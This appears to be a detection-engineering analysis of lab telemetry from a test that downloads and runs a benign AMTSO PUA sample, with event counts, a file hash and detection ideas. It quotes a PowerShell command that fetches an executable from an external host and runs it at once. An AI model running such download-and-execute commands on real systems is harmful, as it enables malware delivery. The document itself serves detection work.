# T1204.002-8: Malicious File — Potentially Unwanted Applications (PUA)

## Technique Context

T1204.002 (User Execution: Malicious File) covers a spectrum from overtly malicious executables to Potentially Unwanted Applications (PUAs) — software that may not be technically malware but exhibits behaviors that users or administrators would object to, such as adware, browser hijackers, data collectors, or cryptominers. PUAs are a common initial access vector because they often arrive through social engineering (free software bundles, fake downloads), may be signed, and frequently bypass endpoint controls that focus on known-malware signatures. The AMTSO (Anti-Malware Testing Standards Organization) test files used here represent standardized, benign PUA samples that endpoint security products should detect as potentially unwanted.

## What This Dataset Contains

This dataset captures the complete PUA download and execution chain in an undefended environment. Security EID 4688 records the critical process creation: PowerShell (PID 0x42d0) spawned with the command `"powershell.exe" & {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe & "$env:TEMP/PotentiallyUnwanted.exe"}`.

Critically, this dataset contains what the defended dataset does not: Security EID 4688 records `C:\Windows\Temp\PotentiallyUnwanted.exe` (PID 0x4410) actually launching as a child process of PowerShell (0x42d0) with command line `"C:\Windows\TEMP\PotentiallyUnwanted.exe"`. In the defended environment, Defender blocked the PotentiallyUnwanted.exe execution before it could run. Here, with defenses disabled, the executable runs successfully.

Sysmon EID 22 records the DNS resolution for `amtso.eicar.org` resolving to `::ffff:81.7.7.163`. Sysmon EID 3 records the subsequent TCP network connection from PowerShell (PID 17104, matching 0x42d0) to `81.7.7.163` from source IP `192.168.4.16` (the ACME-WS06 workstation), tagged with `RuleName: technique_id=T1059.001,technique_name=PowerShell`. This network connection event — DNS resolution plus TCP connection to the destination IP — is the download of `PotentiallyUnwanted.exe` captured in Sysmon.

The Sysmon channel provides 33 total events: 18 EID 7 (DLL loads), 4 EID 10, 4 EID 1, 2 EID 17, 2 EID 11, 1 EID 29 (file executable detection), 1 EID 22, and 1 EID 3. Sysmon EID 29 records the file hash for `PotentiallyUnwanted.exe`: `SHA256=42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732`. The Application channel records two `Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON` events, showing the test framework re-enabling Defender after the test.

The PowerShell channel records 99 events (97 EID 4104, 2 EID 4103), predominantly test framework boilerplate with the cleanup block confirming test completion.

## What This Dataset Does Not Contain

The behavior of `PotentiallyUnwanted.exe` once it executes is not captured — the AMTSO test file is intentionally benign and performs a minimal action (likely displaying a dialog or writing a file) without any malicious network callbacks, persistence, or lateral movement. A real PUA would generate additional EID 4688 / EID 1 events, possible registry modifications, and network connections.

No child processes of `PotentiallyUnwanted.exe` appear in the dataset, suggesting its execution was brief and self-contained. There are no EID 13 registry modification events, no additional network connections from the PUA process itself, and no further file creation events attributed to it.

## Assessment

This dataset is particularly valuable because it illustrates the precise point where Defender's PUA protection makes a difference. In the defended dataset (Sysmon: 38, Security: 8, PowerShell: 42), `PotentiallyUnwanted.exe` does not execute — the Security channel shows only 8 events with no `PotentiallyUnwanted.exe` process creation. In this undefended dataset, the executable launches (Security EID 4688 confirms PID 0x4410) and Sysmon records the full download chain including DNS resolution, network connection, and file hash.

The network telemetry (Sysmon EID 3 + EID 22) provides a complete picture of the download: DNS query to `amtso.eicar.org`, resolution to `81.7.7.163`, TCP connection on port (expected 80, unencrypted HTTP given the `http://` URL), and the file arriving at `C:\Windows\TEMP\PotentiallyUnwanted.exe`. The SHA-256 hash from Sysmon EID 29 (`42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732`) enables retrospective threat intelligence correlation.

## Detection Opportunities Present in This Data

- **Security EID 4688 / Sysmon EID 1**: PowerShell executing `Invoke-WebRequest` with an HTTP (not HTTPS) URL pointing to an `*.exe` file followed by immediate execution of the downloaded file is a high-risk pattern; legitimate software distributions use HTTPS
- **Security EID 4688**: `"C:\Windows\TEMP\PotentiallyUnwanted.exe"` as a process name — any executable running from `%TEMP%` is anomalous; TEMP-resident executables are a strong behavioral indicator of malware delivery
- **Sysmon EID 22 + EID 3**: DNS query to an external domain immediately followed by a TCP connection and file creation in TEMP confirms the download pattern; the combination of all three within seconds is a reliable detection chain
- **Sysmon EID 29**: File executable event recording the SHA-256 hash of the downloaded binary enables retrospective hash-based blocking even after the fact; the hash `42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732` is the AMTSO test PUA
- **Sysmon EID 3**: Network connection from PowerShell to external IP tagged with `technique_id=T1059.001` by sysmon-modular rules — PowerShell making outbound connections is itself a detection signal, especially when followed by file writes and process creation
- **Application EID**: The `SECURITY_PRODUCT_STATE_ON` status change events on either side of the attack confirm the detection gap window; in a real attack, the absence of Defender status change events would mean the gap was achieved through other means (e.g., persistence-based disable, not just test framework manipulation)
